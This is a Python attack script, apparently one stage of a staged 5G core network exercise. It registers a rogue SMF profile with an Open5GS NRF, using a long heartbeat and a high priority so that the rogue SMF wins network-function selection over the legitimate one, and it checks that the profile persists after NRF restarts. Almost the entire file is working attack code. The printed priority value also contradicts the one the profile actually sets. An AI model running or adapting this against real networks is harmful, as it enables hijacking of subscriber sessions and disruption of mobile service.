#!/usr/bin/env python3
"""
Stage 13 — Account Manipulation (Rogue NF Registration)
Scenario 3: Service Disruption

Goal: register a persistent, high-priority rogue SMF profile with NRF,
positioned to win NF selection over the legitimate SMF (tested in
Stage 14) and to survive across NRF restarts (persistence check).
"""

import subprocess
import json
import uuid

NRF_ADDRESS = "192.168.134.128"
NRF_PORT = 7777
ROGUE_IP = "192.168.134.130"  # attacker's own address

def curl_json(method, target_url, body=None):
    cmd = ["curl", "-s", "-w", "\n%{http_code}", "--http2-prior-knowledge",
           "-X", method, target_url]
    if body is not None:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    result = subprocess.run(cmd, capture_output=True, text=True)
    output = result.stdout.strip()
    *body_lines, status_code = output.rsplit("\n", 1)
    response_body = "\n".join(body_lines)
    try:
        parsed = json.loads(response_body) if response_body else None
    except json.JSONDecodeError:
        parsed = None
    return int(status_code), parsed


def register_rogue_smf():
    rogue_id = str(uuid.uuid4())
    url = f"http://{NRF_ADDRESS}:{NRF_PORT}/nnrf-nfm/v1/nf-instances/{rogue_id}"

    profile = {
        "nfInstanceId": rogue_id,
        "nfType": "SMF",
        "nfStatus": "REGISTERED",
        "heartBeatTimer": 86400,       # long-lived, blends in with normal scaling
        "priority": -1,                  # lower number = higher priority in most 3GPP-style selection
        "capacity": 100,
        "ipv4Addresses": [ROGUE_IP],
        "nfServices": [
            {
                "serviceInstanceId": str(uuid.uuid4()),
                "serviceName": "nsmf-pdusession",
                "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
                "scheme": "http",
                "nfServiceStatus": "REGISTERED",
                "priority": 1,
                "capacity": 100,
                "ipEndPoints": [{"ipv4Address": ROGUE_IP, "port": 7777}]
            }
        ]
    }

    print(f"[*] Registering rogue SMF: {rogue_id}")
    print(f"    priority=0 capacity=100 (attempting to outrank legitimate SMF)")
    status, resp = curl_json("PUT", url, body=profile)
    print(f"[*] Status: {status}")
    if status in (200, 201):
        print("[+] Registered successfully.")
    else:
        print(f"[-] Failed: {resp}")
    return rogue_id


def check_persistence(rogue_id):
    """Check whether the rogue profile is still discoverable - meant to be
    re-run after manually restarting NRF on sim to test persistence."""
    url = f"http://{NRF_ADDRESS}:{NRF_PORT}/nnrf-disc/v1/nf-instances"
    status, body = curl_json("GET", f"{url}?target-nf-type=SMF&requester-nf-type=AMF")
    if status == 200 and body:
        found = any(i.get("nfInstanceId") == rogue_id for i in body.get("nfInstances", []))
        print(f"[{'✓' if found else '✗'}] Rogue SMF {'still present' if found else 'NOT found'} after check.")
    return status, body


if __name__ == "__main__":
    rid = register_rogue_smf()
    print(f"\n[*] Rogue NF ID for persistence testing: {rid}")
    print("[*] To test persistence: restart open5gs-nrf on sim, then re-run")
    print("    this script's check_persistence() against this same ID.")
